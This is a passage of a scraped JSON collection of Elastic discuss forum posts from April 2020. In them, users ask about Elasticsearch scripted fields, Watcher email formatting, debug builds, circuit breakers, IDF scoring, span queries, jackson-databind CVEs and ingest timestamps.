    "category": [
      "Elasticsearch"
    ],
    "author": "rohitarora275",
    "date": "April 13, 2020, 9:53am April 13, 2020, 10:17am April 14, 2020, 12:44pm April 17, 2020, 12:08pm April 15, 2020, 4:01pm April 17, 2020, 12:08pm",
    "body": "Hi All, I am new to ELK stack, I want to implement a logic to find the count of daily success transactions on the basis of a field status(if status = \"S\" it is success). I have implemented this logic by creating an scripted field (if status = S then set scripted field = 1) and then in the visualization , I have created a sum metric and I have got the count of daily success. My question is, Is there a workaround to handle the complete logic in visualization rather than calculating at each field because calculating at field level may impact the performance?",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "eb50acff-c155-4ba9-9ea8-d2358a3671d3",
    "url": "https://discuss.elastic.co/t/transform-email-body-response-to-a-more-readable-form/227889",
    "title": "Transform email body response to a more readable form",
    "category": [
      "Elasticsearch"
    ],
    "author": "Alexandros888",
    "date": "April 14, 2020, 10:29pm April 17, 2020, 7:50am April 15, 2020, 9:11am April 15, 2020, 9:36am April 16, 2020, 2:15pm April 16, 2020, 10:22pm",
    "body": "Hello, I have created the following watcher alert: { \"trigger\": { \"schedule\": { \"hourly\": { \"minute\": [ 1, 3, 11, 16, 23, 31, 41, 51 ] } } }, \"input\": { \"search\": { \"request\": { \"search_type\": \"query_then_fetch\", \"indices\": [ \"simulation-connect\" ], \"rest_total_hits_as_int\": true, \"body\": { \"query\": { \"bool\": { \"must\": [ { \"match_phrase\": { \"customerNr_onBehalf\": { \"query\": \"1234\" } } }, { \"range\": { \"@timestamp\": { \"gte\": \"now-50m\" } } } ], \"filter\": [ { \"bool\": { \"should\": [ { \"bool\": { \"should\": [ { \"match\": { \"resultAddArticleToBasket\": true } } ], \"minimum_should_match\": 1 } }, { \"bool\": { \"should\": [ { \"bool\": { \"should\": [ { \"match\": { \"resultArticleSearch\": true } } ], \"minimum_should_match\": 1 } }, { \"bool\": { \"should\": [ { \"bool\": { \"should\": [ { \"match\": { \"resultFullTextSearch\": true } } ], \"minimum_should_match\": 1 } }, { \"bool\": { \"should\": [ { \"bool\": { \"should\": [ { \"match\": { \"resultLogout\": true } } ], \"minimum_should_match\": 1 } }, { \"bool\": { \"should\": [ { \"bool\": { \"should\": [ { \"match\": { \"resultLogin\": true } } ], \"minimum_should_match\": 1 } }, { \"bool\": { \"should\": [ { \"match\": { \"resultVehicleSearch\": true } } ], \"minimum_should_match\": 1 } } ], \"minimum_should_match\": 1 } } ], \"minimum_should_match\": 1 } } ], \"minimum_should_match\": 1 } } ], \"minimum_should_match\": 1 } } ], \"minimum_should_match\": 1 } } ] } } } } } }, \"condition\": { \"compare\": { \"ctx.payload.hits.total\": { \"gte\": \"1\" } } }, \"actions\": { \"send_email\": { \"email\": { \"profile\": \"standard\", \"to\": [ \"alexandros.ananikidis@sag-ag.ch\" ], \"subject\": \"[CH PROD] Connect CH Customer Simulation Failed\", \"body\": { \"text\": \"Elastic results are the following: {{#ctx.payload.hits.hits}}{{_source}}{{/ctx.payload.hits.hits}}\" } } } } } And the output is correctly like that: image1799×387 45.1 KB Nevertheless, because as anyone can imagine it is extremely inconvenient to read how can i change the code in my alert so i can have at the end an email notification that will show the info in a more easy and clear way to read? For example like that: The results are the following: Hit 1 resultLogin=true, @timestamp=1586857855, resultVehicleSearch=true, resultArticleSearch=true, resultFullTextSearch=true, sessionID=455108a4054a4c2a93fa23cba4bc85c4, customerNr_onBehalf=1234, resultAddArticleToBasket=true, resultLogout=true Hit 2 resultLogin=true @timestamp=1586858457, resultVehicleSearch=true, resultArticleSearch=true, resultFullTextSearch=true, sessionID=63c8aebbd39842398afa7b7399025526, customerNr_onBehalf=1234, resultAddArticleToBasket=true, resultLogout=true Hit 3....and so on",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "9a0676cf-288b-40b2-8d0c-c36a8546a1bf",
    "url": "https://discuss.elastic.co/t/failing-to-run-on-intellij-in-debug-mode/227805",
    "title": "Failing to run on Intellij in debug mode",
    "category": [
      "Elasticsearch"
    ],
    "author": "amitkg",
    "date": "April 13, 2020, 8:48pm April 15, 2020, 6:36pm April 15, 2020, 9:18pm April 16, 2020, 4:12am April 16, 2020, 7:01pm April 16, 2020, 7:01pm",
    "body": "Hi, I followed the instruction, provided CONTRIBUTING.md and TESTING.asciidoc, to setup Elasticsearch on Intellij (macOS 10.15.4) . I was able to run it normal mode but I am unable to run it in debug mode. This worked: ./gradlew run But failed to run with following error: ./gradlew run --debug-jvm > Task :distribution:run FAILED Running elasticsearch in debug mode, node{:distribution:runTask-0} suspending until connected on debugPort 5005 Exec output and error: | Output for ./bin/elasticsearch-keystore:ERROR: transport error 202: connect failed: Connection refused | ERROR: JDWP Transport dt_socket failed to initialize, TRANSPORT_INIT(510) | JDWP exit error AGENT_ERROR_TRANSPORT_INIT(197): No transports initialized [:732] FAILURE: Build failed with an exception. * What went wrong: Execution failed for task ':distribution:run'. > Process 'command './bin/elasticsearch-keystore'' finished with non-zero exit value 2 System Config: ======================================= Elasticsearch Build Hamster says Hello! Gradle Version : 6.3 OS Info : Mac OS X 10.15.4 (x86_64) Compiler JDK Version : 14 (AdoptOpenJDK) Compiler java.home : /Library/Java/JavaVirtualMachines/adoptopenjdk-14.jdk/Contents/Home Runtime JDK Version : 11 (Oracle JDK) Runtime java.home : /Library/Java/JavaVirtualMachines/jdk-11.0.4.jdk/Contents/Home Gradle JDK Version : 14 (AdoptOpenJDK) Gradle java.home : /Library/Java/JavaVirtualMachines/adoptopenjdk-14.jdk/Contents/Home Random Testing Seed : FE1157C27A452AC1 In FIPS 140 mode : false ======================================= What am I missing? Is some kind of keystore to setup? I would appreciate your help on this. Regards, Amit",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "59067532-abf2-4424-92db-8d2124d34be4",
    "url": "https://discuss.elastic.co/t/query-plugin-performance-issue/228391",
    "title": "Query Plugin Performance issue",
    "category": [
      "Elasticsearch"
    ],
    "author": "adrik",
    "date": "April 16, 2020, 6:30pm",
    "body": "Background: Every token consist of payload representing our own custom position value. Use of Custom Plugin: During processing of Term, we use the term's payload as the position. During the processing of nextDoc, we only select the document whose queried term has the same position. Custom Query: Every term wrapped inside this query should have the same position (in case of our same payload information) Profiling the query: - Processing is taking time during 'nextDoc' step Processing of the custom query plugin is taking a longer time. - Total Docs : ~ 1 Million - Master Node : 1 - Data Node : 2 Master Node Configuration: 8 vcpu, 61 GB RAM, SSD , (AWS instance: i3.2xlarge) Data Node Configuration: 8 vcpu, 61 GB RAM, SSD , (AWS instance: i3.2xlarge) Question : Is there a way to set term position during indexing ? Processing of custom query is taking a longer time. (Comparing this process with span query). Is there some way to increase the performance using this positional approach?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "5dcb820b-07a2-4c3e-8891-ae90f4eba145",
    "url": "https://discuss.elastic.co/t/garbage-collection-not-happening-leads-to-circuit-breakers-tripping-es-7-5/228383",
    "title": "Garbage Collection not happening, leads to circuit breakers tripping (ES 7.5)",
    "category": [
      "Elasticsearch"
    ],
    "author": "Jonathan_Mendenhall",
    "date": "April 16, 2020, 5:48pm",
    "body": "What we are seeing is out ES 7.5 data nodes tripping \"PERMANENT\" circuit breakers after running a few fairly simple queries, that the exact same index on ES 6.4 is able to handle without issue. I've included a bunch of the information we've collected below, but so far as I can tell, GC is just not triggering. Despite us having already applied the recommended G1GC settings (as described in pull requests and referenced in many topics in this forum). The worst part about these circuit breakers triggering is that 9 times out of 10, we would probably be better off if the node in question simply crashed. In the past, when a circuit breaker tripped during shard recovery, the cluster silently left us with a missing replica until someone noticed and manually triggered a retry. And currently, when these queries trigger a circuit breaker, the affected nodes are just taken out of service for several hours (I'm not sure exactly how, but after this happened yesterday, the nodes eventually come back in). Which not only caused Kibana to crash on startup (with logs mentioning the circuit breakers), but also meant that our queries could still run while some of the nodes were still up, but because nodes were missing, the results were partial. ES 7.5 OpenJDK 11 OS: Windows Configured max memory: 30 GB Java settings: https://gist.githubusercontent.com/Ultraseamus/d97f274db3039c55b8e8c2614ff462df/raw/c65fa872bf859f520c11d75d85d9e214bd5662dc/java%20settings Node Stats: https://gist.githubusercontent.com/Ultraseamus/d97f274db3039c55b8e8c2614ff462df/raw/c65fa872bf859f520c11d75d85d9e214bd5662dc/Node%20Stats gc.log: https://gist.githubusercontent.com/Ultraseamus/d97f274db3039c55b8e8c2614ff462df/raw/c65fa872bf859f520c11d75d85d9e214bd5662dc/gc.log%20(GMT) Node logs: https://gist.githubusercontent.com/Ultraseamus/d97f274db3039c55b8e8c2614ff462df/raw/c65fa872bf859f520c11d75d85d9e214bd5662dc/node%20logs",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "acb03f3a-e9d1-452c-82a6-ec679e57afbf",
    "url": "https://discuss.elastic.co/t/help-interpreting-explain-results-idf-behavior-newbie/228217",
    "title": "Help interpreting explain results, IDF behavior (newbie)",
    "category": [
      "Elasticsearch"
    ],
    "author": "redec",
    "date": "April 15, 2020, 11:26pm April 16, 2020, 8:01am April 16, 2020, 5:11pm",
    "body": "I have 2 documents which match my filter, and both have an identical value in the field being queried, but yet they yield vastly different scores. Here is the returned result: { \"took\" : 3, \"timed_out\" : false, \"_shards\" : { \"total\" : 6, \"successful\" : 6, \"skipped\" : 0, \"failed\" : 0 }, \"hits\" : { \"total\" : { \"value\" : 2, \"relation\" : \"eq\" }, \"max_score\" : 0.72951484, \"hits\" : [ { \"_shard\" : \"[taskassignment][2]\", \"_node\" : \"yCeD_OyyQqqbBRoMgqP_ng\", \"_index\" : \"taskassignment\", \"_type\" : \"_doc\", \"_id\" : \"0536f1edb103480f9d7917fdb29a2f09\", \"_score\" : 0.72951484, \"_source\" : { \"tenantSlug\" : \"0536f1edb103480f9d7917fdb29a2f09\", \"project\" : { \"name\" : \"asd\", }, }, \"_explanation\" : { \"value\" : 0.72951484, \"description\" : \"sum of:\", \"details\" : [ { \"value\" : 0.72951484, \"description\" : \"weight(project.name.ngram:a in 11) [PerFieldSimilarity], result of:\", \"details\" : [ { \"value\" : 0.72951484, \"description\" : \"score(freq=1.0), product of:\", \"details\" : [ { \"value\" : 2.2, \"description\" : \"boost\", \"details\" : [ ] }, { \"value\" : 0.72951484, \"description\" : \"idf, computed as log(1 + (N - n + 0.5) / (n + 0.5)) from:\", \"details\" : [ { \"value\" : 13, \"description\" : \"n, number of documents containing term\", \"details\" : [ ] }, { \"value\" : 27, \"description\" : \"N, total number of documents with field\", \"details\" : [ ] } ] }, { \"value\" : 0.45454544, \"description\" : \"tf, computed as freq / (freq + k1 * (1 - b + b * dl / avgdl)) from:\", \"details\" : [ { \"value\" : 1.0, \"description\" : \"freq, occurrences of term within document\", \"details\" : [ ] }, { \"value\" : 1.2, \"description\" : \"k1, term saturation parameter\", \"details\" : [ ] }, { \"value\" : 0.75, \"description\" : \"b, length normalization parameter\", \"details\" : [ ] }, { \"value\" : 5.0, \"description\" : \"dl, length of field\", \"details\" : [ ] }, { \"value\" : 5.0, \"description\" : \"avgdl, average length of field\", \"details\" : [ ] } ] } ] } ] }, { \"value\" : 0.0, \"description\" : \"match on required clause, product of:\", \"details\" : [ { \"value\" : 0.0, \"description\" : \"# clause\", \"details\" : [ ] }, { \"value\" : 1.0, \"description\" : \"tenantSlug:0536f1edb103480f9d7917fdb29a2f09\", \"details\" : [ ] } ] } ] } }, { \"_shard\" : \"[taskassignment][3]\", \"_node\" : \"FmUxDSnbT8qvwSkPtC3Agg\", \"_index\" : \"taskassignment\", \"_type\" : \"_doc\", \"_id\" : \"9536f1edb102480f9d7117fdb29a2faa\", \"_score\" : 0.3276874, \"_source\" : { \"tenantSlug\" : \"0536f1edb103480f9d7917fdb29a2f09\", \"project\" : { \"name\" : \"asd\", }, \"task\" : { \"name\" : \"vbnt\", }, }, \"_explanation\" : { \"value\" : 0.3276874, \"description\" : \"sum of:\", \"details\" : [ { \"value\" : 0.3276874, \"description\" : \"weight(project.name.ngram:a in 0) [PerFieldSimilarity], result of:\", \"details\" : [ { \"value\" : 0.3276874, \"description\" : \"score(freq=1.0), product of:\", \"details\" : [ { \"value\" : 2.2, \"description\" : \"boost\", \"details\" : [ ] }, { \"value\" : 0.3276874, \"description\" : \"idf, computed as log(1 + (N - n + 0.5) / (n + 0.5)) from:\", \"details\" : [ { \"value\" : 24, \"description\" : \"n, number of documents containing term\", \"details\" : [ ] }, { \"value\" : 33, \"description\" : \"N, total number of documents with field\", \"details\" : [ ] } ] }, { \"value\" : 0.45454544, \"description\" : \"tf, computed as freq / (freq + k1 * (1 - b + b * dl / avgdl)) from:\", \"details\" : [ { \"value\" : 1.0, \"description\" : \"freq, occurrences of term within document\", \"details\" : [ ] }, { \"value\" : 1.2, \"description\" : \"k1, term saturation parameter\", \"details\" : [ ] }, { \"value\" : 0.75, \"description\" : \"b, length normalization parameter\", \"details\" : [ ] }, { \"value\" : 5.0, \"description\" : \"dl, length of field\", \"details\" : [ ] }, { \"value\" : 5.0, \"description\" : \"avgdl, average length of field\", \"details\" : [ ] } ] } ] } ] }, { \"value\" : 0.0, \"description\" : \"match on required clause, product of:\", \"details\" : [ { \"value\" : 0.0, \"description\" : \"# clause\", \"details\" : [ ] }, { \"value\" : 1.0, \"description\" : \"tenantSlug:0536f1edb103480f9d7917fdb29a2f09\", \"details\" : [ ] } ] } ] } } ] } } This is the query I ran: GET /taskassignment/_search { \"explain\": true, \"query\": { \"bool\": { \"must\": { \"match\": { \"project.name.ngram\": \"a\" } }, \"filter\": { \"term\": { \"tenantSlug\": \"0536f1edb103480f9d7917fdb29a2f09\"} } } } } This is my mappings/settings: { \"taskassignment\" : { \"mappings\" : { \"properties\" : { \"project\" : { \"properties\" : { \"name\" : { \"type\" : \"text\", \"fields\" : { \"ngram\" : { \"type\" : \"text\", \"analyzer\" : \"ngram\" } } }, } }, \"tenantSlug\" : { \"type\" : \"keyword\", \"ignore_above\" : 256 }, } }, \"settings\" : { \"index\" : { \"analysis\" : { \"analyzer\" : { \"ngram\" : { \"filter\" : [ \"lowercase\" ], \"tokenizer\" : \"ngram\" } }, \"tokenizer\" : { \"ngram\" : { \"token_chars\" : [ \"letter\", \"digit\" ], \"min_gram\" : \"1\", \"type\" : \"ngram\", \"max_gram\" : \"2\" } } }, } } } } From what I can tell, it's detecting different document counts for the idf calculation for different records within the same query....how is this possible? Like, do I understand it correctly, that's counting the number of documents that have the letter 'a' in the project.name field, right? Is that document count supposed to be of all the documents which match my filter?...or of all the documents in the index?....neither seem accurate.....or all the documents in the shard? (plausible). is it possible to disable the idf calculation? In my use-case I think it will cause more problems than its worth...",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "8ad68510-d2b6-44a8-9b0c-cc602f0715df",
    "url": "https://discuss.elastic.co/t/vulnerabilities-associated-with-jackson-databind-2-8-11-3/228376",
    "title": "Vulnerabilities associated with jackson-databind 2.8.11.3",
    "category": [
      "Elasticsearch"
    ],
    "author": "Sunil_Chadha",
    "date": "April 16, 2020, 5:04pm",
    "body": "Hi, In the Elasticsearch 6.8.4 jackson-databind version 2.8.11.3 used. This version of Jackson-databind has many high vulnerabilities associated. CVE-2019-16943 CVE-2018-19360 CVE-2019-14893 CVE-2018-14719 CVE-2019-16335 CVE-2019-14892 CVE-2017-7525 CVE-2018-14718 CVE-2018-19362 CVE-2020-11612 CVE-2019-14540 CVE-2019-17531 CVE-2019-17267 CVE-2018-5382 CVE-2018-14721 CVE-2019-20330 CVE-2020-8840 CVE-2018-19361 CVE-2019-16942 CVE-2019-14379 CVE-2018-14720 How is Jackson-databind used in Elasticsearch, whether these vulnerabilties applies to Elasticsearch 6.8.4 OSS? I notices that Elasticsearch mater use jackson = 2.10.3. When is it planned to be released? Thanks & Regards, Sunil",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "8076a3a2-ae8b-4491-9f29-076b6b983e41",
    "url": "https://discuss.elastic.co/t/elastic-search-5-6-getting-http-1-1-504-gateway-timeout/228371",
    "title": "Elastic Search 5.6 - Getting HTTP/1.1 504 Gateway Timeout",
    "category": [
      "Elasticsearch"
    ],
    "author": "kc404",
    "date": "April 16, 2020, 4:36pm",
    "body": "We are using ES 5.6. Our application (Java,Play) keeps on receiving requests on application-akka.actor.default-dispatcher and response for those will be collected by ForkJoinPool.commonPool-worker threads from elastic. At a certain time, we see sudden increase in requests on application-akka.actor.default-dispatcher and for a minute or so there is no log for ForkJoinPool.commonPool-worker threads and next thing we see is HTTP/1.1 504 Gateway Timeout on some requests and then logs for ForkJoinPool.commonPool-worker is back and they are supplied with more requests from.application-akka.actor.default-dispatcher and making queued tasks in elastic more than 1000. We can see this in logs and following that there are errors like 429 Too Many Requests and 503 Service Unavailable. And that is making application crash. I think we are missing some config in elastic side which is making first 504 Error. We are not using any proxy between our application and Elastic.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "46140844-7bd6-4161-ba36-1a1680db8fa6",
    "url": "https://discuss.elastic.co/t/charm-elasticsearch-security-and-p12-certificates-with-password/228363",
    "title": "Charm Elasticsearch Security and P12 certificates with password",
    "category": [
      "Elasticsearch"
    ],
    "author": "jgato",
    "date": "April 16, 2020, 4:04pm",
    "body": "I have almost everything up and running to enable security, certificates, user and password. But the p12 certificate is protected with a password. How do I configure that in the Charm values?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "d359f50c-776e-4120-8a08-983ebc97c5e1",
    "url": "https://discuss.elastic.co/t/poximity-search-with-wildcards-and-phrase-multiple-word-terms/228360",
    "title": "Poximity search with wildcards and phrase (multiple word terms)",
    "category": [
      "Elasticsearch"
    ],
    "author": "th.wyns",
    "date": "April 16, 2020, 3:55pm",
    "body": "Hello, We have a business requirement where the customer would like to run proximity searches that contain wildcards and phrases (multiple words). For eg: query: \"somet*\" within 5 word distance of \"need to find\" should match: \"something that we need to find\" should not match: \"something to find is the need\" How can we achieve this in Elasticsearch? I was able to solve the wildcard part but so far I couldn't figure out how to execute it with multi word phrases. This is what I came up so far (missing the phrase requirement): GET basic_tests/_search { \"query\": { \"span_near\" : { \"clauses\" : [ { \"span_multi\": {\"match\" : { \"wildcard\" : { \"text\" : { \"value\" : \"somet*\"} } }}}, { \"span_multi\": {\"match\" : { \"prefix\" : { \"text\" : { \"value\" : \"this is not working for phrase\"} } }}} ], \"slop\" : 5, \"in_order\" : true } } } Thanks!",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "cb9f3279-8b04-42ee-a78b-9b8e0fe5a3ed",
    "url": "https://discuss.elastic.co/t/how-to-store-and-search-for-same-values-in-a-field/228357",
    "title": "How to store and search for same values in a field",
    "category": [
      "Elasticsearch"
    ],
    "author": "kent120103",
    "date": "April 16, 2020, 3:46pm",
    "body": "Dear Elastic community, My index contains following documents: {. \"_index\": \"sametokensearch\", \"_type\": \"_doc\", \"_id\": \"1\", \"found\": true, \"_source\": { \"dob\": [\"202\", \"020\", \"20-\", \"0-0\", \"-03\", \"03-\", \"3-0\", \"-03\"] } } {. \"_index\": \"sametokensearch\", \"_type\": \"_doc\", \"_id\": \"2\", \"found\": true, \"_source\": { \"dob\": [\"202\", \"020\", \"20-\", \"0-0\", \"-03\", \"03-\", \"3-0\", \"-04\"] } } {. \"_index\": \"sametokensearch\", \"_type\": \"_doc\", \"_id\": \"3\", \"found\": true, \"_source\": { \"dob\": [\"202\", \"020\", \"20-\", \"0-0\", \"-03\", \"03-\", \"3-0\", \"-05\"] } } There are three documents. Each document only has one field - \"dob\". This field is an array of \"text\" values. Its mapping is { \"sametokensearch\": { \"mappings\": { \"properties\": { \"dob\": { \"type\": \"text\", \"fields\": { \"keyword\": { \"type\": \"keyword\", \"ignore_above\": 256 } } } } } } } Elasticsearch release = 7.5.0 Then I search for documents as /sametokensearch/doc/_search?size=50 { \"query\": { \"query_string\": { \"query\": \"dob: (202 AND 020 AND 20- AND 0-0 AND \\\\-03 AND 03- AND 3-0 AND \\\\-03)\" } } } Result is all of the three documents. But if I search for \"dob: (202 AND 020 AND 20- AND 0-0 AND \\\\-03 AND 03- AND 3-0 AND \\\\-04)\", result is the document of id = 2. My first search query contains the same \"text\" value - \"-03\" twice. To me, it seems like the multiple occurs of \"-03\" token have been treated as single occur during search. What I would like to achieve is Searching for dob: (202 AND 020 AND 20- AND 0-0 AND \\-03 AND 03- AND 3-0 AND \\-03), returns only the document of id = 1. It is more like a precisely match. Searching for dob: (202 AND 020 AND 20- AND 0-0 AND \\-03 AND 03- AND 3-0), returns all the 3 documents. Because this field contains 8 values in all 3 document, but I only search for 7 of them. The order of tokens is also considered. Since all of the 3 documents start with \"202, 020\". If I search for dob: (020 AND 202), there should be no match. Is it possible to change my search query without changing my index?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "06c99999-ef8c-47a2-9442-9f6d6a77d960",
    "url": "https://discuss.elastic.co/t/transform-date-field-timestamp-failed-to-parse-field/228192",
    "title": "Transform date field (timeStamp) \"failed to parse field\"",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 15, 2020, 7:03pm April 16, 2020, 5:22am April 16, 2020, 3:27pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "90d08a72-e88e-4fd8-910e-2699765a3bc5",
    "url": "https://discuss.elastic.co/t/inconsistent-error-messages-when-throwing-an-exception-in-a-painless-script/228350",
    "title": "Inconsistent Error messages when throwing an exception in a painless script",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 16, 2020, 2:59pm",
    "body": "",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "2e8545c9-b26e-4f8b-ba8d-f07083c911f9",
    "url": "https://discuss.elastic.co/t/word-frequency-for-search-term/228332",
    "title": "Word Frequency for search term",
    "category": [
      "Elasticsearch"
    ],
    "author": "sanjaye218",
    "date": "April 16, 2020, 1:44pm",
    "body": "Hi, I am trying to find word frequency suing query string. But in case search term is more than single word and field is of type text, then its returning incorrect results. Like if my data is \"This is word tied off\" and with below query, its searching tied off as tied and off separately, returning doc.freq as 1 for tied and 1 for off, so total 2 for this document. I am expecting doc.freq as 1 as tied off matches one time. \"query\": { \"bool\": { \"must\": [ { \"query_string\": { \"query\": \"\"tied off\"\", \"fields\": [ \"comments\" ] } } ] } }",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "9c0ef11f-bb68-4d75-9c55-db762356262a",
    "url": "https://discuss.elastic.co/t/cloud-nat-egress-cost-to-elastic-cloud/228327",
    "title": "Cloud NAT egress cost to elastic cloud",
    "category": [
      "Elasticsearch"
    ],
    "author": "Edgar_Peixoto",
    "date": "April 16, 2020, 1:27pm",
    "body": "I have a Elastic Cloud as a service and a google private GKE cluster in the same region with filebeat and metric beat sending metrics to my EC installation. They are using Cloud NAT. I noticed a great cost using Cloud NAT because beats send a lost of GB to EC. Is there any way to avoid this cost?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "89ac08a2-ce53-4458-93e5-36912c7d6761",
    "url": "https://discuss.elastic.co/t/string-manipulation-in-scripts/228321",
    "title": "String Manipulation in Scripts",
    "category": [
      "Elasticsearch"
    ],
    "author": "dawiro",
    "date": "April 16, 2020, 1:10pm",
    "body": "Hi, If I have a string looking something like: aaa-bbb-ccc-dddd How can I use painless scripts to extract ccc into a new field? Thx D",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "6b33654c-1a0b-47d2-a4d0-a8f006d42713",
    "url": "https://discuss.elastic.co/t/cant-fetch-data-using-rest-postman/228318",
    "title": "Can't fetch data using REST / POSTMAN",
    "category": [
      "Elasticsearch"
    ],
    "author": "ahmadalibaloch",
    "date": "April 16, 2020, 1:00pm",
    "body": "I did a simple deployment and using the JS client pushed some records for an index 'hear2learn'. That was successful. I can also fetch records using JS client. but when I do a request using POSTMAN or browser passing my credentials. like this. https://db5706372f4b41ea9ee7647ac8fe1647.asia-southeast1.gcp.elastic-cloud.com:9243/hear2learn/_search I get no records but only { \"took\" : 0, \"timed_out\" : false, \"_shards\" : { \"total\" : 1, \"successful\" : 1, \"skipped\" : 0, \"failed\" : 0 }, \"hits\" : { \"total\" : { \"value\" : 0, \"relation\" : \"eq\" }, \"max_score\" : null, \"hits\" : } } Can somebody guide me what is the problem, I am new. I also get 0 hits or results when doing the request from my Flutter App using a simple http request with my credentials.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "75d4aa2c-c6da-4d7d-ad39-42b216ebd889",
    "url": "https://discuss.elastic.co/t/are-elk-6-rpms-supported-on-centos8-python3/228315",
    "title": "Are elk 6 rpms supported on centos8/python3?",
    "category": [
      "Elasticsearch"
    ],
    "author": "akshatsharma",
    "date": "April 16, 2020, 12:22pm April 16, 2020, 12:36pm",
    "body": "Hi, We are using elk 6.6.1 rpms along with elasticsearch-curator-5.6.0. I just wanted to check if all these RPMs are supported on centos8/python3.x. Best Regards, Akshat Sharma",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "83fcefff-de53-4871-9293-ea880ae85175",
    "url": "https://discuss.elastic.co/t/elasticsearch-does-not-work-with-network-host-0-0-0-0/228162",
    "title": "Elasticsearch does not work with network.host 0.0.0.0",
    "category": [
      "Elasticsearch"
    ],
    "author": "wiktort",
    "date": "April 15, 2020, 4:02pm April 15, 2020, 4:20pm April 15, 2020, 5:39pm April 15, 2020, 6:51pm April 16, 2020, 12:50am April 16, 2020, 12:27pm",
    "body": "I have been trying to set up a test version of a website on a different server. The website uses React, Strapi, Postgres, Nginx and Elasticsearch. All of them are working, but the website is stuck on a loader. I do not whether it is something with Elasticsearch or something else. However, I had a problem with network.host in yml file. When it was network.host 127.0.0.1 I could curl only for 127.0.0.1:9200 and it did not work with server-ip:9200. When I had changed it into 0.0.0.0, I could not restart elastic. So I have changed it into html.host 0.0.0.0. and it works for both 127.0.0.1:9200 and server-ip:9200. Can I leave it like that? I mean with html.host. Or it shouldn't be like that? Thank you for your help in advance!",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "073359f5-dd2c-4c00-9d51-1aff26d7349b",
    "url": "https://discuss.elastic.co/t/elastic-search-workplace-search-implementation-on-linux-server/228308",
    "title": "Elastic search + workplace search implementation on linux server",
    "category": [
      "Elasticsearch"
    ],
    "author": "anchal_kalra",
    "date": "April 16, 2020, 11:37am",
    "body": "We are trying to implement elastic workplace search on a linux server referring the link: https://www.elastic.co/downloads/enterprise-search The Red Hat linux server is a restricted one and we can't directly download anything in it. So, we downloaded linux elastic search 7.6.0 and enterprise search 7.6.0 in our local windows system. Unzipped those tar files and transferred to linux server. But while executing bin/elasticsearch getting error like [admin@VICTCOGHZ03 elasticsearch-7.6.0]$ ./bin/elasticsearch -f ./bin/elasticsearch-env: line 2: $'\\r': command not found : invalid option namenv: line 3: set: pipefail Java _Home is set in the server [admin@VICTCOGHZ03 ~]$ echo $JAVA_HOME /usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-8.b10.el7_5.x86_64/jre/bin/java Also tried out to remove any windows based spaces in the file. [admin@VICTCOGHZ03 bin]$ sed -i -e 's/\\r$//' elasticsearch Any pointers on how configuration changes can be made to make it work as well as workplace search will be helpful",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "7cef8269-fb68-418c-82d1-560fcfc62e3b",
    "url": "https://discuss.elastic.co/t/an-example-of-more-simple-pre-indexed-shapes-filtering-and-more-complex-ones-not-filtering/228183",
    "title": "An example of more simple pre-indexed shapes filtering and more complex ones not filtering",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 15, 2020, 6:27pm April 16, 2020, 7:15am April 16, 2020, 10:10am April 16, 2020, 10:34am April 16, 2020, 11:41am April 16, 2020, 11:22am",
    "body": "",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "24944b84-4224-4f99-a507-128d97d5ab42",
    "url": "https://discuss.elastic.co/t/invalid-date-format-for-ingest-timestamp/228272",
    "title": "Invalid date format for ingest timestamp",
    "category": [
      "Elasticsearch"
    ],
    "author": "Adam_Szaraniec",
    "date": "April 16, 2020, 10:39am",
    "body": "I need some help with pipeline (set ingest.timestamp) { \"set\": { \"field\": \"meta.timestamp\", \"value\": \"{{_ingest.timestamp}}\" } } I've defined this pipeline, and mapping for this field is type: date format: \"yyyy-MM-dd'T'HH:mm:ss.SSSSSSZZ\" However when I try to reindex documents I got error failed to parse field [meta.timestamp] of type [date] in document with id \"reason\": \"Invalid format: \"2020-04-16T08:00:14Z\" is malformed at \"Z\"\" I am using ES 6.8. Any clues? How its possible that {{_ingest.timestamp}} has not valid format ? Similar when I do create lot of documents in short period of time, I got similar error (happen very rarely ) I've test it in Java public static void main(String[] args) { for (int i = 0; i < 999999; i++) { System.out.println(ZonedDateTime.now(ZoneOffset.UTC)); } } and it seems that Java 'truncate' output 2020-04-16T08:23:27Z 2020-04-16T08:23:27Z 2020-04-16T08:23:27.001Z 2020-04-16T08:23:27.001Z 2020-04-16T08:23:27.001Z How is correct way to use ingest.timestamp, if its format is not consistent ?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "36bc7c3d-9218-4954-8b4d-6a1a17c8da9f",
    "url": "https://discuss.elastic.co/t/question-about-prequery-of-dfs-query-then-fetch/228287",
    "title": "Question about prequery of DFS_Query_then_Fetch",
    "category": [
      "Elasticsearch"
    ],
    "author": "Hyunsoo_Shim",
    "date": "April 16, 2020, 9:20am April 16, 2020, 9:44am April 16, 2020, 10:36am April 22, 2020, 7:19am",
    "body": "Hello, I have a simple question about \"prequery\" step of \"DFS_Query_then_Fetch\" search type. When we create an index of only 1 primary shard and make 4 replicas, is \"prequery\" excuted for all 5 shards(primary and replicas) in this case? Thanks for your help always!",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "8bff1e51-ab1c-4419-925e-ee8984c6bb88",
